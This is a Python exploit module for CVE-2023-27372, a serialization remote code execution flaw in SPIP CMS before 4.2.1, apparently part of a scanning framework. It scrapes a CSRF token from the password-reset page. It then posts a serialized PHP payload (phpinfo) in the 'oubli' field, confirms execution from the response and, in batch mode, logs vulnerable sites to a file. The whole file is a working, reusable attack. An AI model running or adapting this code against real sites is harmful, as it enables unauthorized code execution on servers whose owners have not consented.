# ! /usr/bin/python3
# -*- encoding: utf-8 -*-

from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests
import bs4

class Cve_2023_27372:

    def __init__(self):
        self.header = None
        self.proxy = None
    def send_payload2(self, url):
        url2 = url + '/spip.php?page=spip_pass'
        header = {
            "User-Agent": self.header,

        }
        try:
            r = requests.get(url2, timeout=3, verify=self.verify, proxies=self.proxy, headers=header)
            soup = bs4.BeautifulSoup(r.text, 'html.parser')
            csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
            if csrf_input:
                csrf_value = csrf_input['value']
                return csrf_value
        except Exception:
            # OutPrintInfo("SPIP", "不存在SPIP-Cms <4.2.1_CVE-2023-27372_序列化RCE")
            return None
    def send_payload(self, url):
        csrf_value = self.send_payload2(url)
        if csrf_value:
            url2 = url + '/spip.php?page=spip_pass'
            header = {
                "User-Agent": self.header,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1"

            }
            data = f'page=spip_pass&formulaire_action=oubli&formulaire_action_args={csrf_value}&oubli=s:19:"<?php phpinfo(); ?>";&nobot='
            try:
                req = requests.post(url2, timeout=3, verify=self.verify, proxies=self.proxy, headers=header,data=data)
                if "disable_functions" in req.text:
                    if not self.batch:
                        OutPrintInfoSuc("SPIP", f"存在SPIP-Cms <4.2.1_CVE-2023-27372_序列化RCE")
                        OutPrintInfo("SPIP", url2)
                        OutPrintInfo("SPIP", f"CSRF-TOKEN: {csrf_value}")
                        OutPrintInfo("SPIP", f"DATA: {data}")
                    else:
                        OutPrintInfoSuc("SPIP", f"存在SPIP-Cms序列化RCE {url2}")
                        with open("./result/spip_2023_27372.txt","a") as w:
                            w.write(f"{url2}\n")
                    return True
            except Exception:
                if not self.batch:
                    OutPrintInfo("SPIP", "不存在SPIP-Cms <4.2.1_CVE-2023-27372_序列化RCE")
                return False

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("SPIP", "开始检测SPIP-Cms <4.2.1_CVE-2023-27372_序列化RCE...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("SPIP", "SPIP-Cms <4.2.1_CVE-2023-27372_序列化RCE检测结束")
